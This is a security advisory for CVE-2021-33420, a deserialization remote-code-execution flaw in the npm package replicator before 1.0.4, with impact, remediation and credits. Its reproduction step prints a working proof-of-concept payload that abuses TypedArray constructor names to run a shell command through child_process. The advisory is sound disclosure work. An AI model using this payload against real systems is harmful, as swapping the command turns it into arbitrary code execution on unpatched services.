---
title: Deserialization RCE attack in replicator
date: 2021-05-17
tags:
	- "npm"
	- "deserialization"
	- "rce"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2021-4787/
cves:
	- "CVE-2021-33420"
---
## Summary
Affected versions of replicator npm package are vulnerable to a deserialization RCE via the TypedArrays objects. replicator doesn't verify the object type given when deserializing TypedArrays and thus letting an attacker create arbitrary objects.

## Product
replicator before 1.0.4.

## Impact
In case an untrusted data get deserialized, an attacker could achieve RCE.

## Steps to reproduce
```
replicator.decode('[{"@t":"[[TypedArray]]","data":{"ctorName":"setTimeout","arr":​{"@t":"[[TypedArray]]","data":{"ctorName":"Function","arr":"process.mainModule.require(\'child_process\').exec(\'calc\');"}}​}}]')
```

### Expected result:
The command in the exec function will be run, in this case aimed for a Windows machine a calculator will pop up.

## Remediation
Update replicator dependency to 1.0.4 or above.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Pull request](https://github.com/inikulin/replicator/pull/17)
2. [Issue](https://github.com/inikulin/replicator/issues/16)
3. [Commit](https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b)
4. [Blog](https://checkmarx.com/blog/npm-replicator-remote-code-execution-deserialization)
